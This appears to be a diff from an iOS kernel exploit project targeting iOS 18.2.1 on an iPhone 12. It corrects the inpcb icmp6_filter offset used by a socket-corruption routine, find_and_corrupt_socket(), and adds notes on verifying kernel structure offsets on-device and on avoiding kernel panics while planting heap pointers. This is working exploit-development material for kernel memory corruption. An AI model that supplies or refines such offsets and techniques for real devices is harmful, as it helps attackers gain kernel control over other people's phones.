@@ -25,17 +25,19 @@
 // SO_PROTO 0x20, PR_INPUT 0x20 -- so ICMP6FILT/SO_PROTO are stable across
 // the 18.x line; only SO_COUNT differs (0x208 here vs 0x254 on 18.4+).
 //
-// NOTE: OFFSET_ICMP6FILT (0x138) is PROVEN WRONG on this device/kernel
-// (xnu-11215 / iOS 18.2.1 / iPhone 12 A14): every inpcb slot dump shows
-// filt(+0x138)=0 yet every socket's getsockopt(ICMP6_FILTER) succeeds with
-// the all-ones fresh filter (a NULL in6p_icmp6filt would return EINVAL).
-// The real offset lives in the inp_depend6 union region and is now discovered
-// empirically at runtime by find_and_corrupt_socket() (brute-force oracle
-// 0x88..0x208), stored in gIcmp6FiltOffset. 0x138 remains only as the
-// pre-discovery fallback value.
+// NOTE: OFFSET_ICMP6FILT is VERIFIED at runtime, on-device, as 0x148 on this
+// kernel (xnu-11215 / iOS 18.2.1 / iPhone 12 A14):
+//   - every inpcb slot dump (dump_inp_*.bin) shows filt(+0x138)=0 but a valid
+//     per-socket kernel-heap pointer at +0x148
+//   - clearsword_utils.c (wh1te4ever): inpcb_icmp6filt = 0x148 for iOS 18+
+//   - a NULL in6p_icmp6filt would make getsockopt(ICMP6_FILTER) return EINVAL,
+//     yet every socket's filter reads back as all-ones
+// find_and_corrupt_socket() probes ONLY +0x148 (single targeted plant + oracle)
+// and stores it in gIcmp6FiltOffset. Do NOT wide-scan 0x88..0x208: planting
+// heap pointers into arbitrary live inpcb fields panics the kernel.
 #define OFFSET_PCB_SOCKET      0x40   // inpcb -> socket (unchanged 15.x-18.4)
 #define OFFSET_SOCKET_SO_COUNT 0x208  // socket so_retaincnt (iOS 18.0-18.3.x)
-#define OFFSET_ICMP6FILT       0x138  // inpcb icmp6_filter pointer (18.x) -- fallback; real offset brute-forced at runtime
+#define OFFSET_ICMP6FILT       0x148  // inpcb icmp6_filter pointer (18.x) -- VERIFIED on-device
 #define OFFSET_SO_PROTO        0x20   // socket -> protosw (18.x)
 #define OFFSET_PR_INPUT        0x28   // protosw -> pr_input (18.2.x)
 
